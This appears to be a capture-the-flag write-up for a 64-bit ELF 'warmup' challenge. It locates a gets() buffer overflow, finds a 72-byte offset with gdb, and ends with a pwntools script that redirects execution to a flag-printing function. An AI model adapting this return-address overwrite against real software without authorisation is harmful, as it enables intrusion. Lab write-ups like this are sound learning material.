I first identified the target as a 64-bit ELF executable. Running the binary prints a function address, `0x40060d`, before prompting for input. I then used Ghidra to decompile the binary, which revealed a buffer overflow vulnerability in `main` caused by an unbounded `gets()` call on a 64-byte buffer.

The printed address belongs to the `easy()` function, which contains a `system("cat flag.txt")` call. This function became my target for redirecting execution.

#### **Finding the Offset**

To calculate the offset to the return address, I used `gdb`. After setting a breakpoint after the `gets()` call, I found my input buffer on the stack at address `0x7fffffffde50`. By inspecting the stack frame, I located the saved return address at `0x7fffffffde98`. The difference between these two addresses (`0xde98 - 0xde50`) confirmed the offset is **`0x48`** (72) bytes.

#### **Exploitation**

I wrote a simple exploit script using `pwntools`. The payload was constructed with 72 bytes of padding followed by the address of the `easy()` function (`0x40060d`) in little-endian format.

```python
from pwn import *

target = process('./warmup')

payload = b"A" * 0x48        # 72 bytes of padding
payload += p64(0x40060d)   # Address of easy()

target.sendline(payload)
target.interactive()
```
